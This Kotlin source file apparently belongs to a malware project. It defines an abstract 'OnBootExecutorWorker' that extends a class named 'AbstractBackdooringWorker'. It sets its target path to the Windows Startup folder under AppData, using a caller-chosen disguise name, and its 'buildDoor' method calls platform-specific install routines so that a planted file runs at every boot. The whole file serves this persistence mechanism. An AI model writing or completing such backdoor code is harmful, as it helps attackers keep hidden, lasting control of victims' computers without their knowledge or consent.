package net.kerner.entkerner.extractors.standart

import io.ktor.client.*
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.abstract.AbstractBackdooringWorker
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.abstract.get
import net.kerner.entkerner.io.FileUtils.Windows.appData
import net.kerner.entkerner.io.nullPath
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.model.SystemType
import java.io.File
import java.nio.file.Path
import kotlin.io.path.div

abstract class OnBootExecutorWorker(
    val publicName: String,
    val httpClient: HttpClient,
    override val entkerner: Entkerner
) : AbstractBackdooringWorker(httpClient, entkerner) {
    override val name = "OnBootExecutionWorker"
    override val file = object : SystemFileURI() {
        override val windows = appData  / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / publicName
        override val linux = nullPath
        override val darwin = nullPath
    }
    init {
        println(file[entkerner.system].toFile().absolutePath)
        file[entkerner.system].toFile().mkdir()
    }

    override fun buildDoor(file: File): Boolean {
        when(entkerner.system) {
            SystemType.WINDOWS -> installWindows(file)
            SystemType.LINUX -> installLinux(file)
            SystemType.XNU -> installDarwin(file)
        }
        return file.exists()
    }

    abstract fun installWindows(file: File)
    abstract fun installLinux(file: File)
    abstract fun installDarwin(file: File)




}